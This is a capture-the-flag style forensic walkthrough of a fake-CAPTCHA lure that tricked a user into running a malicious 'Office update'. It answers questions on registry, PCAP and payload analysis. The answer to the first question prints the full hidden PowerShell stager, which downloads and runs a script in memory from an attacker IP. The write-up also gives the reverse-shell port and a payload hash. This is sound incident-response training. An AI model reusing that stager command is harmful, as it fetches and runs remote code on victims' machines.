
##### Sherlock Scenario

Happy Grunwald contacted the sysadmin, Alonzo, because of issues he had downloading the latest version of Microsoft Office. He had received an email saying he needed to update, and clicked the link to do it. He reported that he visited the website and solved a captcha, but no office download page came back. Alonzo, who himself was bombarded with phishing attacks last year and was now aware of attacker tactics, immediately notified the security team to isolate the machine as he suspected an attack. You are provided with network traffic and endpoint artifacts to answer questions about what happened.

___

### Q1: It is crucial to understand any payloads executed on the system for initial access. Analyzing registry hive for user happy grunwald. What is the full command that was run to download and execute the stager.

#### A: powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://43.205.115.44/office2024install.ps1')"

We go to the hive of the indicated user.

![](../../Img/Pasted%20image%2020250513152918.png)

Load it and go to bookmark.
Under RunMRU we find it.

![](../../Img/Pasted%20image%2020250513153145.png)

___

### Q2: At what time in UTC did the malicious payload execute?

#### A: 2024-09-23 05:07:45

In the Q1 screenshot.

___

### Q3: The payload which was executed initially downloaded a PowerShell script and executed it in memory. What is sha256 hash of the script?

#### A: 579284442094e1a44bea9cfb7d8d794c8977714f827c97bcb2822a97742914de

To get the hash i need the file, to get the file we use wireshark to open the pcapng file and search.
One of the only 2 things that i have is the ip, so we use as filter.
Looking through the packets we spot the 2nd thing that we know, the file name.

![](../../Img/Pasted%20image%2020250513153952.png)

After checking that the download name it's the same as the execution name, we search for it in Export HTTP.

![](../../Img/Pasted%20image%2020250513154311.png)

Get the hash.

![](../../Img/Pasted%20image%2020250513154506.png)

___

### Q4: To which port did the reverse shell connect?

#### A: 6969

We see what the file has.

![](../../Img/Pasted%20image%2020250513155127.png)

Decode it. (I use magic) (https://cyberchef.org/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true,false)Decode_text('UTF-16LE%20(1200)'))

![](../../Img/Pasted%20image%2020250513155219.png)

___

### Q5: For how many seconds was the reverse shell connection established between C2 and the victim's workstation?

#### A: 403

With the port, we add it to the filter in wireshark and calculate.

![](../../Img/Pasted%20image%2020250513155836.png)

![](../../Img/Pasted%20image%2020250513160049.png)

___

### Q6: Attacker hosted a malicious Captcha to lure in users. What is the name of the function which contains the malicious payload to be pasted in victim's clipboard?

#### A: stageClipboard

I remember that in Q3 i saw clear http traffic, so i went to see it.

![](../../Img/Pasted%20image%2020250513160502.png)

It seems to be the web page.

![](../../Img/Pasted%20image%2020250513160526.png)

Reading through it i found it. (If the pcapng was massive, the http filter would have helped)

![](../../Img/Pasted%20image%2020250513160553.png)

Tags: [Network Traffic Analysis](../../Index/Network%20Traffic%20Analysis.md) [NTUSER Analysis](../../Index/NTUSER%20Analysis.md) [Registry Explorer](../../Index/Registry%20Explorer.md) [Wireshark](../../Index/Wireshark.md) 